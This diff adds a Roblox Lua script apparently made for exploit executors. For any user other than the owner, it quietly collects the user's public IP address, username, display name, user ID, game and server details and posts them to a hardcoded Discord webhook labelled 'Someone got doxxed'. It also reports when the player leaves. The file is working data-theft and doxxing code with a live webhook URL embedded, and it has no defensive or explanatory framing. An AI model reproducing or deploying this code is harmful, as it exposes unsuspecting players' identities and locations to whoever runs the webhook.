@@ -1,0 +1,34 @@
+function SendDis(Message)
+    if game:GetService("Players").LocalPlayer.Name ~= _G.OwnerUser then
+        pcall(function()
+            httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+            local data = {
+                content = Message
+            }
+            
+            local headers = {
+                ["Content-Type"] = "application/json"
+            }
+            
+            httprequest({
+                Url = "https://discord.com/api/webhooks/1286060281541296240/fzetUf2r3RQXFM3bnXVnbwBLUsHpSpZ1R0dmxKRF23Ca4YKNOgtn3KKKRzS1aSI_VFYj",
+                Method = "POST",
+                Headers = headers,
+                Body = game:GetService("HttpService"):JSONEncode(data)
+            })
+        end)
+    end
+end
+
+-- Adding IP Address to the Message
+function AddIPtoMessage(Message)
+    return Message .. "\n" .. "IP Address: " .. game:HttpGet("http://whatismyip.akamai.com/")
+end
+
+SendDis(AddIPtoMessage("```" .. "Someone got doxxed lmfao" .. "\n" .. "UserName: " .. game:GetService("Players").LocalPlayer.Name .. "\n" .. "Display Name: ".. game:GetService("Players").LocalPlayer.DisplayName .. "\n" .. "UserId: " .. game:GetService("Players").LocalPlayer.UserId .. "\n" .. "Game: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n" .. "Game Id: " .. game.PlaceId .. "\n" .. "Server Id: " .. game.JobId .. "\n" .. "Server Size: " .. #game:GetService("Players"):GetChildren() .. "/" .. game:GetService("Players").MaxPlayers .. "\n" .. "https://www.roblox.com/games/" .. game.PlaceId .. "```"))
+
+game:GetService("Players").ChildRemoved:Connect(function(Player)
+    if Player.Name == game:GetService("Players").LocalPlayer.Name then
+        SendDis(AddIPtoMessage("```" .. "This Person Left" .. "\n" .. "Username: " .. game:GetService("Players").LocalPlayer.Name .. "```"))
+    end
+end)
